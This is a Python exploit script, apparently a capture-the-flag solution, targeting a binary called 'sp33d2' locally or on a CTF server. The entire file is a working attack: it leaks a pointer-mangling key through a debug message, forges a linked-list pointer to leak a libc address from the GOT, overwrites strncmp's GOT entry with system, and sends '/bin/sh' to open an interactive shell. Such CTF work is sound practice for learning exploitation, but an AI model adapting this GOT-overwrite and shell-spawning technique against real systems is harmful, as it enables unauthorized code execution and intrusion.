#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

# exe = ptr.ELF("./sp33d2_patched")
exe = ptr.ELF("./sp33d2")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("sp33d.play.hfsc.tf", 1357)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def rolq(value: int, shift_amount: int) -> int:
    mask = 0xFFFFFFFFFFFFFFFF
    shift_amount &= 63
    return ((value << shift_amount) | (value >> (64 - shift_amount))) & mask


def rolq_inverse(rotated_value: int, shift_amount: int) -> int:
    shift_amount &= 63
    return (rotated_value >> shift_amount) | (rotated_value << (64 - shift_amount))


def main():
    io = connect()

    def add(data: bytes):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"thing: ", data)

    def print_() -> bytes:
        io.sendlineafter(b"> ", b"2")
        return io.recvuntil(b"1)", drop=True)

    def delete(index: int):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"index: ", str(index).encode())

    add(b"XDEBUG: " + b"A" * 0x40)
    corrupted_link = int(print_().split(b"corrupt = ")[1][0:18], 16)
    key = corrupted_link ^ rolq_inverse(0x4141414141414141, 0x11)
    key = key & 0xFFFFFFFFFFFFFFFF
    ptr.logger.info(f"key: {hex(key)}")

    strncmp_got = unwrap(exe.got("strncmp"))
    strncmp_got_link = rolq(key ^ strncmp_got, 0x11)
    add(b"XDEBUG: " + b"A" * 0x30 + ptr.p64(strncmp_got_link))
    libc_addr = rolq(int(print_().split(b"corrupt = ")[1][0:18], 16) ^ key, 0x11)
    libc_addr = 0xFFFFFFFFFFFFFFFF & libc_addr
    libc.base = libc_addr - unwrap(libc.symbol("fgets"))

    delete(3)
    system = unwrap(libc.symbol("system"))
    add(ptr.p64(system)[:-2])
    add(b"/bin/sh")

    io.interactive()
    return


if __name__ == "__main__":
    main()
